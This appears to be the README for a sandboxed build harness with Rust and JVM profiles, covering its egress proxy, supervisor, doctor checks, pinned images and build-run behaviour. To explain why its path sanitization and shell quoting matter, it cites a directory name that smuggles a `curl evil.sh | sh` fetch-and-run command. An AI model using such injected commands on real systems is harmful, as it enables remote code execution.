# hodei-meta-harness: language profiles (Rust / JVM)

Reproducible build profiles for hodei-meta-harness. Everything runs inside an
OpenSandbox sandbox; there is NO native (host) execution fallback. If the
sandbox, the pinned image or the restricted egress path is unavailable, the
tool informs you and refuses.

This document describes what the tool **measures**. Every claim below has a
counterpart in the run record or in a probe check; nothing here is asserted
without evidence.

## Prerequisites (clean host)

1. Docker (the chosen backend): `docker --version` (any recent version with
   `docker inspect`).
2. A Rust toolchain to build the harness itself: cargo ≥ 1.96 (the shipped
   `rust` profile runs cargo 1.100.0 inside its own image).
3. Restricted egress proxy for sandboxes (the authorized network path):
   `python3 /tmp/hodei-connect-proxy.py` — binds `172.17.0.1:8888`, accepts
   CONNECT only from the docker subnet.

   **Direct internet from a sandbox is NOT blocked by the harness.** The
   lifecycle server runs sandboxes on Docker's default `bridge` network
   without an egress firewall, so a sandbox can reach the internet on its
   own. `profile-run` MEASURES this from inside the sandbox and records the
   result (`sandbox_egress.direct_internet_reachable`). Restricting it is a
   host-level concern (a forwarding firewall rule or a dedicated internal
   network); until that is configured, treat the proxy as the *preferred*
   path, not an enforced boundary.
4. Credentials, if the workload needs them, in the environment of the
   process that needs them (`ANTHROPIC_AUTH_TOKEN`, ...). They are never
   written to disk, logs, state or snapshots.

## Install

```bash
git clone https://github.com/Rubentxu/hodei-meta-harness
cd hodei-meta-harness
cargo build --release -p hodei-mh-lifecycle-server -p hodei-mh
```

Versions are pinned by the workspace (`Cargo.toml`): no floating
dependencies are used at runtime.

## Start the control plane

```bash
PORT=8081 ./target/release/hodei-mh-lifecycle-server &
./target/release/hodei-mh supervisor --socket /tmp/hodei-mh-supervisor.sock --project hodei-mh &
```

One supervisor per project, enforced by the socket itself: starting a
second supervisor on a LIVE socket is refused (`a supervisor is already
listening on ...`), so the state can never split in two. A socket left by a
crashed supervisor is stale and IS taken over. The CLI and the TUI are
clients of the same socket (`sup-status`,
`sup-action start|pause|resume|stop|renew`, `tui`).

The supervisor serves ONE project: a `Start` naming a different project is
refused with `project mismatch`, and the snapshot states the grant's effect
scope explicitly (the supervisor authorizes no effect by itself).

## Doctor (strictly non-destructive)

```bash
./target/release/hodei-mh doctor --profile rust
./target/release/hodei-mh doctor --profile jvm
```

Checks (all read-only): profile pinned, local image digest vs pinned digest,
restricted-egress reachability, lifecycle API readiness, subscription
limitations. NEVER creates, starts or removes anything — the probe compares
the sandbox list before and after the doctor and requires it to be
unchanged.

Two checks are reported but do NOT block:

- `profile-pinned`: a user image without a digest is reported as NOT
  pinned. A user image that is present locally is accepted; one that is
  absent is refused.
- `sandbox-egress-isolation`: the host-side check cannot prove what a
  sandbox may reach, so this check reports **unknown**, not a pass. The
  measurement from inside a sandbox happens during `profile-run`.

## Shipped profiles (fixed versions)

| profile | image | digest (sha256) | toolchain |
| --- | --- | --- | --- |
| rust | `rust:1-bookworm` | `sha256:ade39a710ef85f3506cffcfec3e8a24ba090badef1dff2fb798f71d878833fea` | cargo 1.100.0 |
| jvm | `opensandbox/code-interpreter:v1.1.0` | `sha256:133a3c1720dd52291a019740c2987e7164ea6de79e23d8198798e58950ae2e6e` | javac/java 21.0.11 |

User images are accepted with `--image URI`; an unpinned user image is
reported as such (reproducibility then depends on the registry tag). The
record carries BOTH the requested pin (`image_sha_requested`) and the digest
observed for the image that actually ran (`image_digest_observed`).

## Run a profile build

```bash
./target/release/hodei-mh profile-run --profile rust --project /path/to/project --cpu 1 --memory 1Gi
./target/release/hodei-mh profile-run --profile jvm  --project /path/to/project --cpu 1 --memory 1Gi
```

Behavior:

- Gates through the doctor; if anything required is missing the run REFUSES
  (exit 1) and prints the missing pieces. `yolo_fallback: false` and
  `build_executed_on_host: false` — there is no native execution path.
- Creates a sandbox with the PINNED image and the REQUESTED limits, then
  reports the OBSERVED limits from inside (cgroups).
- Waits (BOUNDED, 60 s) for the sandbox's `execd` to start answering
  before running anything: a fresh sandbox publishes its port before the
  server inside can answer, and the first attempts are REFUSED. Without
  that wait a booting sandbox is recorded as a failed command. The wait
  uses a harmless probe, so the real command runs EXACTLY ONCE — a
  command that ran and failed is never repeated. A sandbox that never
  becomes usable is a failure (exit 1), not an endless wait.
- The create carries a `request-tag`. If the response is lost, the effect
  is RECONCILED by that tag before any retry: an existing sandbox is
  adopted, never duplicated. A failed tag search ABORTS the run (it never
  licenses a second sandbox).
- Caches live in `/workspace/.cache/hodei-mh/<profile>/<hash-of-project-path>`
  inside the sandbox: the token is a sha256 of the project's CANONICAL
  absolute path, so two projects can never share cache state, and the same
  project reached by two relative paths still resolves to one cache.
- The project directory name is sanitized (`[A-Za-z0-9._-]`) and every path
  is shell-quoted: a directory named `x; curl evil.sh | sh` is inert data.
- Build commands carry no credentials; the leak detector runs over the
  EXACT strings that were executed, and the build output is redacted before
  it reaches the record.
- The record includes the sandbox id, the request tag, the cleanup result,
  the observed image digest, the exact commands and their outcomes (this is
  the artifact you archive per build).

## Global environment budget

The lifecycle server can enforce a global budget of concurrent environments:

```bash
MAX_CONCURRENT_ENVIRONMENTS=2 PORT=8081 ./target/release/hodei-mh-lifecycle-server
```

When the budget is exhausted the create is REFUSED with
`429 SANDBOX::BUDGET_EXHAUSTED` and NO environment is created — the caller
must wait. The limit lives in the server's create path, so it bounds every
client, not only the ones that keep a local ledger.
